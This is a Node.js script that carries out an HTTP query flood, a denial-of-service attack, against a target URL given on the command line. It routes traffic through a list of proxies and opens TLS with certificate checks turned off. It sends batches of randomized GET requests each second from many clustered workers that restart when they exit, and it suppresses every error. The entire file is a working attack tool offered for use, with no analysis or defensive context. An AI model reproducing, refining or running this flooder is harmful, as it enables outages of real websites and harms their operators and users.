const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var colors = require('colors');
var theJar = request_2.jar();
const path = require("path");
const { cpus } = require('os');
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;
const cluster = require('cluster');

var cookies = {};

var VarsDefinetions = {
Objetive: process.argv[2],
time: process.argv[3],
rate: process.argv[4],
threads: process.argv[5],
proxyFile: process.argv[6]
}

if (process.argv.length !== 7) {
    console.log(`                       
Usage: node ${path.basename(__filename)} <Target> <Time> <Rate> <Threads> <ProxyFile>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <30> <50> proxies.txt
------------------------------------------------------------------
Dependencies: user-agents.txt (User Agents) | proxies.txt (Proxies)
`);
    process.exit(0);
}

var fileName = __filename;
var file = path.basename(fileName);

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

var proxies = readLines(VarsDefinetions.proxyFile);

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0"
];

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

function RandomString(length) {
  var result = '';
  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  var charactersLength = characters.length;
  for (var i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}

var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function BuildRequest() {
    let path = parsed.path || '/';
    if (path.indexOf("[rand]") !== -1) {
        path = path.replace(/\[rand\]/g, RandomString(getRandomNumberBetween(5,16)));
    }
    var raw_socket = 'GET' + ' ' + path + '?query=' + RandomString(getRandomNumberBetween(1,24)) + ' HTTP/1.1\r\n' +
                    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
                    'Upgrade-Insecure-Requests: 1\r\n' +
                    'Host: ' + parsed.host + '\r\n' +
                    'User-Agent: ' + useragents[Math.floor(Math.random() * useragents.length)] + '\r\n' +
                    'Accept-Language: en-US,en;q=0.9\r\n' +
                    'Accept-Encoding: gzip, deflate, br, zstd\r\n' +
                    'Fetch-Dest: document\r\n' +
                    'Fetch-Mode: navigate\r\n' +
                    'Fetch-Site: none\r\n' +
                    'Connection: keep-alive\r\n\r\n';
    return raw_socket;
}

function runFlooder() {
    if (proxies.length === 0) return;
    
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr || !proxyAddr.includes(':')) return;
    
    const [phost, pport] = proxyAddr.split(':');
    
    const proxySocket = net.connect({
        host: phost,
        port: parseInt(pport)
    });

    proxySocket.setTimeout(10000);

    const connectRequest = `CONNECT ${parsed.host}:443 HTTP/1.1\r\nHost: ${parsed.host}:443\r\nConnection: keep-alive\r\n\r\n`;

    proxySocket.on('connect', () => {
        proxySocket.write(connectRequest);
    });

    proxySocket.on('data', (chunk) => {
        const response = chunk.toString();
        if (response.includes('200')) {
            const tlsSocket = tls.connect({
                socket: proxySocket,
                servername: parsed.host,
                rejectUnauthorized: false
            });

            tlsSocket.on('secureConnect', () => {
                const interval = setInterval(() => {
                    for (let i = 0; i < VarsDefinetions.rate; i++) {
                        const request = BuildRequest();
                        tlsSocket.write(request);
                    }
                }, 1000);

                tlsSocket.on('close', () => {
                    clearInterval(interval);
                });

                tlsSocket.on('error', () => {
                    clearInterval(interval);
                });
            });

            tlsSocket.on('error', () => {});
        } else {
            proxySocket.destroy();
        }
    });

    proxySocket.on('error', () => {});
    proxySocket.on('timeout', () => {
        proxySocket.destroy();
    });
}

if (cluster.isPrimary) {
    for (let i = 0; i < VarsDefinetions.threads; i++) {
        cluster.fork();
    }
    
    cluster.on('exit', (worker, code, signal) => {
        cluster.fork();
    });
} else {
    setInterval(runFlooder, 1);
}

setTimeout(() => {
    console.log('\nHTTP QUERY flood sent for ' + process.argv[3] + ' seconds with ' + process.argv[4] + ' rate and ' + process.argv[5] + ' threads! Target: ' + process.argv[2] + '\n');
    process.exit(1);
}, VarsDefinetions.time * 1000);